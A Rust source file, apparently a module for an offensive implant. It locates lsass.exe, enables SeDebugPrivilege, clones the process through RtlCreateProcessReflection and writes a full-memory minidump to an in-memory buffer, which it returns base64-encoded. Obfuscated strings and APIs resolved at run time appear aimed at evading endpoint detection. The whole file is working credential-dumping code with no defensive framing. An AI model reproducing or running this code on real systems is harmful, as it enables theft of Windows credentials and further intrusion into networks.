#![allow(non_snake_case)]
#![allow(unused_imports)]
#![allow(unused_mut)]
#![allow(unused_variables)]
#![allow(unused_assignments)]
use sysinfo::PidExt;
use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::{DWORD_PTR, SIZE_T},
        ntdef::{
            HANDLE, 
            HRESULT,
            LPCWSTR,
            LUID,
            NTSTATUS, PLARGE_INTEGER, PVOID,
        },
        minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPCVOID, LPVOID, MAX_PATH, PDWORD, ULONG},
        winerror::{
            ERROR_NOT_ALL_ASSIGNED,
            S_FALSE, 
            S_OK,
        },
    },
    um::{
        handleapi::{DuplicateHandle},
        libloaderapi::{GetProcAddress, LoadLibraryW}, // resolve these dynamically
        psapi::{PPROCESS_MEMORY_COUNTERS, PROCESS_MEMORY_COUNTERS},
        fileapi::{CreateFileW, CREATE_ALWAYS, },
        processsnapshot::{
            PssCaptureSnapshot,
            PssFreeSnapshot,
            PSS_CAPTURE_FLAGS,
            PSS_CAPTURE_HANDLES,
            HPSS, PSS_CAPTURE_VA_CLONE,
            PSS_CAPTURE_HANDLE_NAME_INFORMATION,
            PSS_CAPTURE_HANDLE_BASIC_INFORMATION,
            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION,
            PSS_CAPTURE_HANDLE_TRACE,
            PSS_CAPTURE_THREADS,
            PSS_CAPTURE_THREAD_CONTEXT,
            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED,
            PSS_CREATE_BREAKAWAY,
            PSS_CREATE_BREAKAWAY_OPTIONAL,
            PSS_CREATE_USE_VM_ALLOCATIONS,
            PSS_CREATE_RELEASE_SECTION,
        },
        winnt::{
            ACCESS_MASK,
            HEAP_ZERO_MEMORY,
            LUID_AND_ATTRIBUTES, 
            MAXIMUM_ALLOWED,
            PTOKEN_PRIVILEGES,
            RtlCopyMemory, 
            SE_DEBUG_NAME,
            SE_PRIVILEGE_ENABLED,
            TOKEN_ADJUST_PRIVILEGES,
            TOKEN_PRIVILEGES,
            TOKEN_QUERY, CONTEXT_ALL, PROCESS_DUP_HANDLE,
        }, processthreadsapi::{GetCurrentProcess, self, GetCurrentProcessId}, lmaccess::NET_VALIDATE_PERSISTED_FIELDS, wincred::NERR_PasswordExpired,
    },
};
use std::{
    ffi::OsStr,
    mem::{drop, forget, MaybeUninit, size_of, size_of_val},
    os::windows::ffi::OsStrExt,
    slice::from_raw_parts_mut, char::from_u32,
};

// dynamically resolved functions
// dll handles and locate function
fn get_dll(dll_name: &str) -> HMODULE {
    let handle = unsafe { LoadLibraryW(get_wide(dll_name).as_ptr()) };
    if handle.is_null() {
        return 0 as _
    }
    handle
}

fn get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let func = unsafe { GetProcAddress(dll, fn_name.as_ptr() as _) };
    if func.is_null() {
        return 0 as _
    }
    func
}

// heapapi
fn get_process_heap() -> Option<unsafe fn() -> HANDLE> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("GetProcessHeap\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_alloc() -> Option<unsafe fn(HANDLE, DWORD, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_realloc() -> Option<unsafe fn(HANDLE, DWORD, LPVOID, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapReAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_free() -> Option<unsafe fn(HANDLE, DWORD, LPVOID) -> bool> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapFree\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_size() -> Option<unsafe fn(HANDLE, DWORD, LPCVOID) -> SIZE_T> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapSize\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

// define enums and structs
#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_CALLBACK_TYPE(pub i32);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_CALLBACK_TYPE {
    const ModuleCallback: Self = Self(0);
    const ThreadCallback: Self = Self(1);
    const ThreadExCallback: Self = Self(2);
    const IncludeThreadCallback: Self = Self(3);
    const IncludeModuleCallback: Self = Self(4);
    const MemoryCallback: Self = Self(5);
    const CancelCallback: Self = Self(6);
    const WriteKernelMinidumpCallback: Self = Self(7);
    const KernelMinidumpStatusCallback: Self = Self(8);
    const RemoveMemoryCallback: Self = Self(9);
    const IncludeVmRegionCallback: Self = Self(10);
    const IoStartCallback: Self = Self(11);
    const IoWriteAllCallback: Self = Self(12);
    const IoFinishCallback: Self = Self(13);
    const ReadMemoryFailureCallback: Self = Self(14);
    const SecondaryFlagsCallback: Self = Self(15);
    const IsProcessSnapshotCallback: Self = Self(16);
    const VmStartCallback: Self = Self(17);
    const VmQueryCallback: Self = Self(18);
    const VmPreReadCallback: Self = Self(19);
    const VmPostReadCallback: Self = Self(20);
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    status: HRESULT
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INPUT {
    process_id: i32,
    process_handle: *mut c_void,
    callback_type: MINIDUMP_CALLBACK_TYPE,
    io: MINIDUMP_IO_CALLBACK,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INFORMATION<'a> {
    CallbackRoutine: *mut c_void,
    CallbackParam: &'a mut *mut c_void,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_IO_CALLBACK {
    handle: *mut c_void,
    offset: u64,
    buffer: *mut c_void,
    buffer_bytes: u32
}

#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_TYPE(pub i64);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_TYPE {
    const MiniDumpNormal: Self = Self(0);
    const MiniDumpWithDataSegs: Self = Self(1);
    const MiniDumpWithFullMemory: Self = Self(2);
    const MiniDumpWithHandleData: Self = Self(3);
    const MiniDumpFilterMemory: Self = Self(4);
    const MiniDumpScanMemory: Self = Self(5);
    const MiniDumpWithUnloadedModules: Self = Self(6);
    const MiniDumpWithIndirectlyReferencedMemory: Self = Self(7);
    const MiniDumpFilterModulePaths: Self = Self(8);
    const MiniDumpWithProcessThreadData: Self = Self(9);
    const MiniDumpWithPrivateReadWriteMemory: Self = Self(10);
    const MiniDumpWithoutOptionalData: Self = Self(11);
    const MiniDumpWithFullMemoryInfo: Self = Self(12);
    const MiniDumpWithThreadInfo: Self = Self(13);
    const MiniDumpWithCodeSegs: Self = Self(14);
    const MiniDumpWithoutAuxiliaryState: Self = Self(15);
    const MiniDumpWithFullAuxiliaryState: Self = Self(16);
    const MiniDumpWithPrivateWriteCopyMemory: Self = Self(17);
    const MiniDumpIgnoreInaccessibleMemory: Self = Self(18);
    const MiniDumpWithTokenInformation: Self = Self(19);
    const MiniDumpWithModuleHeaders: Self = Self(20);
    const MiniDumpFilterTriage: Self = Self(21);
    const MiniDumpWithAvxXStateContext: Self = Self(22);
    const MiniDumpWithIptTrace: Self = Self(23);
    const MiniDumpScanInaccessiblePartialPages: Self = Self(24);
    const MiniDumpValidTypeFlags: Self = Self(25);
}

pub fn get_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn enable_sedebug() -> bool {
    // get DLL handles and locate functions
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let a32_handle = get_dll(obfstr::obfstr!("advapi32.dll"));
    let gcp_func = get_fn(k32_handle, obfstr::obfstr!("GetCurrentProcess\0"));
    let opt_func = get_fn(a32_handle, obfstr::obfstr!("OpenProcessToken\0"));
    let lpvw_func = get_fn(a32_handle, obfstr::obfstr!("LookupPrivilegeValueW\0"));
    let atp_func = get_fn(a32_handle, obfstr::obfstr!("AdjustTokenPrivileges\0"));
    let gle_func = get_fn(k32_handle, obfstr::obfstr!("GetLastError\0"));
    let ch_func = get_fn(k32_handle, obfstr::obfstr!("CloseHandle\0"));

    // define functions
    let GetCurrentProcess: unsafe fn(
    ) -> HANDLE = unsafe { std::mem::transmute(gcp_func as FARPROC) };
    
    let OpenProcessToken: unsafe fn(
        HANDLE,
        DWORD,
        *mut HANDLE, 
    ) -> bool = unsafe { std::mem::transmute(opt_func as FARPROC) };

    let LookupPrivilegeValueW: unsafe fn(
        LPCWSTR,
        LPCWSTR,
        *mut LUID, 
    ) -> bool = unsafe { std::mem::transmute(lpvw_func as FARPROC) };

    let AdjustTokenPrivileges: unsafe fn(
        HANDLE,
        BOOL,
        PTOKEN_PRIVILEGES,
        DWORD,
        PTOKEN_PRIVILEGES,
        PDWORD, 
    ) -> bool = unsafe { std::mem::transmute(atp_func as FARPROC) };

    let GetLastError: unsafe fn(
    ) -> DWORD = unsafe { std::mem::transmute(gle_func as FARPROC) };

    let CloseHandle: unsafe fn(
        HANDLE
    ) -> bool = unsafe { std::mem::transmute(ch_func as FARPROC) };

    // Obtain token handle
    let mut h_token: HANDLE = 0 as _;
    let _ = unsafe { OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut h_token,
    )};

    // Required privilege
    let privs = LUID_AND_ATTRIBUTES {
        Luid: LUID { 
            LowPart: 0, 
            HighPart: 0,
        },
        Attributes: SE_PRIVILEGE_ENABLED,
    };
    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [privs ;1],
    };
    let _ = unsafe { LookupPrivilegeValueW(
        0 as _,
        get_wide(SE_DEBUG_NAME).as_mut_ptr(),
        &mut tp.Privileges[0].Luid,
    )};

    // Enable the privilege
    // ERROR HERE - STATUS_ACCESS_VIOLATION
    let _ = unsafe { AdjustTokenPrivileges(
        h_token,
        false as _,
        &mut tp,
        size_of::<TOKEN_PRIVILEGES>() as _,
        0 as _,
        0 as _,
    )};

    // Check if privilege was enabled
    if unsafe{ GetLastError() } == ERROR_NOT_ALL_ASSIGNED {
        return false
    }
    let _ = unsafe { CloseHandle(h_token) };

    return true
}

pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_CALLBACK_INPUT, callbackOutput: &mut MINIDUMP_CALLBACK_OUTPUT) -> bool {
    match callbackInput.callback_type {
        MINIDUMP_CALLBACK_TYPE::IoStartCallback => { 
            callbackOutput.status = S_FALSE;
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => { 
            callbackOutput.status = S_OK;
            let read_buf_size = callbackInput.io.buffer_bytes;
            let GetProcessHeap = get_process_heap().unwrap();
            let HeapSize = heap_size().unwrap();
            let HeapReAlloc = heap_realloc().unwrap();
            let current_buf_size = unsafe { HeapSize(
                GetProcessHeap(),
                0 as _,
                *buf
            ) };
            // check if buffer is large enough
            let extra_5mb: usize = 1024*1024 * 50;
            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
            if bytes_and_offset >= current_buf_size {
                // increase heap size
                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
                    current_buf_size * 2
                } else {
                    bytes_and_offset + extra_5mb
                };
                *buf = unsafe { HeapReAlloc(
                    GetProcessHeap(),
                    0 as _,
                    *buf,
                    size_to_increase
                )};
            }

            let source = callbackInput.io.buffer as *mut c_void;
            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
            let _ =  unsafe {
                RtlCopyMemory(
                    destination, 
                    source,
                    read_buf_size as usize
                )
            };
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoFinishCallback => { 
            callbackOutput.status = S_OK;
            return true
        },
        _ => {
            return true
        },
        
    }

}

pub fn in_memory_dump(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "".to_string()
    }

    // extract argument
    let mut pid = match args[1].parse::<u32>() {
        Err(_)  => return "".to_string(),
        Ok(pid) => pid,
    };
    
    // get DLL handles and locate functions
    let dbghelp_handle = get_dll(obfstr::obfstr!("C:\\Windows\\System32\\dbghelp.dll"));
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let ntdll_handle = get_dll(obfstr::obfstr!("ntdll.dll"));
    let psapi_handle = get_dll(obfstr::obfstr!("psapi.dll"));
    let getnext_func = get_fn(ntdll_handle, obfstr::obfstr!("NtGetNextProcess\0"));
    let mdwd_func = get_fn(dbghelp_handle, obfstr::obfstr!("MiniDumpWriteDump\0"));
    let getfilename_func = get_fn(psapi_handle, obfstr::obfstr!("GetModuleFileNameExW\0"));
    let getmeminfo_func = get_fn(psapi_handle, obfstr::obfstr!("GetProcessMemoryInfo\0"));
    let getpid_func = get_fn(k32_handle, obfstr::obfstr!("GetProcessId\0"));
    let freelib_func = get_fn(k32_handle, obfstr::obfstr!("FreeLibrary\0"));
    //adding ntdll for the RtlCreatePRocessReflection function
    let ntdll_handle = get_dll(obfstr::obfstr!("ntdll.dll"));
    let rcp_func = get_fn(ntdll_handle, obfstr::obfstr!("RtlCreateProcessReflection\0"));

    // define functions

        //define PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
        type PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = *mut RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;
        //define RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
        #[repr(C)]
        pub struct RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
                pub ReflectionProcessHandle: HANDLE,
                pub ReflectionThreadHandle: HANDLE,
                pub ReflectionClientId: CLIENT_ID,
        };
    
        //adding RtlCreateProcessReflection function
        let RtlCreateProcessReflection: unsafe fn(
            HANDLE, 
            ULONG, 
            PVOID, 
            PVOID, 
            HANDLE, 
            PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION,
        ) -> NTSTATUS = unsafe { std::mem::transmute(rcp_func as FARPROC) };

    let MiniDumpWriteDump: unsafe fn(
        HANDLE, 
        DWORD, 
        HANDLE, 
        u64, 
        *mut c_void, 
        *mut c_void, 
        *mut MINIDUMP_CALLBACK_INFORMATION
    ) -> bool = unsafe { std::mem::transmute(mdwd_func as FARPROC) };

    let FreeLibrary: unsafe fn(
        HMODULE, 
    ) -> bool = unsafe { std::mem::transmute(freelib_func as FARPROC) };

    let NtGetNextProcess: unsafe fn(
        HANDLE, 
        ACCESS_MASK,
        u32,
        u32,
        *mut HANDLE, 
    ) -> NTSTATUS = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let GetModuleFileNameExW: unsafe fn(
        HANDLE,
        HMODULE,
        *mut u16,
        DWORD,
    ) -> DWORD = unsafe { std::mem::transmute(getfilename_func as FARPROC) };

    let GetProcessId: unsafe fn(
        HANDLE
    ) -> DWORD = unsafe { std::mem::transmute(getpid_func as FARPROC) };

    let GetProcessMemoryInfo: unsafe fn(
        HANDLE,
        PPROCESS_MEMORY_COUNTERS,
        DWORD,
    ) -> BOOL = unsafe { std::mem::transmute(getmeminfo_func as FARPROC) };

    #[allow(unused_assignments)]
    let mut handle: HANDLE = 0 as _;
    
    while unsafe { NtGetNextProcess(
        handle,
        MAXIMUM_ALLOWED,
        0,
        0,
        &mut handle,
    )} == 0 {
        let mut buf = [0; MAX_PATH];
        let _ = unsafe { GetModuleFileNameExW(
            handle,
            0 as _,
            &mut buf[0],
            MAX_PATH as _,
        )};
        let buf_str = String::from_utf16_lossy(&buf[..MAX_PATH]);
        if pid == 0 {
            if buf_str.contains(obfstr::obfstr!("C:\\Windows\\System32\\lsass.exe")) {
                // get lsass.exe handle
                pid = unsafe { GetProcessId(handle) };
                break;
            }
        } else {
            if pid == unsafe { GetProcessId(handle) } {
                break;
            }
        }
    }

    if handle.is_null() {
        return obfstr::obfstr!("could not open PID").to_string()
    }

    if !enable_sedebug() {
        return obfstr::obfstr!("SeDebugPrivilege not assigned").to_string()
    }

    // get lsass size and add padding
    // note Aug 24, 22 - I changed this to 50 MB from 5MB in an attempt to troubleshoot dumps only being written to 30MB on first run. Results seem positive so far.
    let extra_5mb: usize = 1024*1024 * 50;
    let buf_size: usize;
    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
    let gpm_ret = unsafe { GetProcessMemoryInfo(
        handle,
        pmc.as_mut_ptr(),
        size_of_val(&pmc) as DWORD
    )};
    if gpm_ret != 0 {
        let pmc = unsafe { pmc.assume_init() };
        buf_size = pmc.WorkingSetSize + extra_5mb;
    } else {
        return "".to_string()
    }

    // alloc memory in current process
    let GetProcessHeap = get_process_heap().unwrap();
    let HeapAlloc = heap_alloc().unwrap();
    let mut buf = unsafe { HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        buf_size
    )};
    forget(buf);

    //print lsass pid
    //println!("Target PID: {}", pid);
    println!("Target PID: {}", unsafe { GetProcessId(handle) });
    //do they match?
    //add process reflection here to clone process and grab handle to new process
    //use ntapi::ntrtl::RtlCreateProcessReflection;
    let mut new_handle: HANDLE = 0 as _;
    let mut new_pid: DWORD = 0 as _;

    //define CLIENT_ID struct
    #[repr(C)]
    #[derive(Debug, Copy, Clone)]
    pub struct CLIENT_ID {
        pub UniqueProcess: HANDLE,
        pub UniqueThread: HANDLE,
    }

    //define info as RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION type with 0 values
    let mut info: RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
        ReflectionProcessHandle: 0 as _,
        ReflectionThreadHandle: 0 as _,
        ReflectionClientId: CLIENT_ID {
            UniqueProcess: 0 as _,
            UniqueThread: 0 as _,
        },
    };

    let refl_flags = 0x00000002;

    //call RtlCreateProcessReflection
    let status = unsafe { RtlCreateProcessReflection (
        handle,
        refl_flags,
        0 as _,
        0 as _,
        0 as _,
        &mut info,
    )};


    //adding as API call for now but later will pull from dll and use function pointer
    /*let mut status = unsafe { RtlCreateProcessReflection(
        handle,
        refl_flags,
        0 as _,
        0 as _,
        0 as _,
        &mut info,
    )};*/

    //check status
    if status == 0 {
        println!("Reflection successful");
        new_handle = info.ReflectionProcessHandle;
        //convert info.ReflectionClientId.UniqueProcess to DWORD
        new_pid = info.ReflectionClientId.UniqueProcess as DWORD;
        println!("New PID: {}", new_pid);
        println!("New handle: {:x?}", new_handle);
    } else {
        println!("Reflection failed");
        return "".to_string()
    }

    // set up minidump callback
    let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
        CallbackRoutine: minidump_callback_routine as _,
        CallbackParam: &mut buf,
    };

    //perform dump with new handle
    let _ = unsafe{ MiniDumpWriteDump(
        new_handle,
        new_pid, 
        0 as _, 
        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
        0 as _, 
        0 as _, 
        &mut callback_info
    )};

    let _ = unsafe { FreeLibrary(dbghelp_handle) };

    // base64
    let buf_slice: &mut [u8] = unsafe { from_raw_parts_mut(buf as _, buf_size) };
    let buf_b64 = base64::encode(buf_slice);

    let HeapFree = heap_free().unwrap();
    let _ = unsafe { HeapFree(
        GetProcessHeap(),
        0 as _,
        buf
    )};
    drop(buf);

    return buf_b64
}





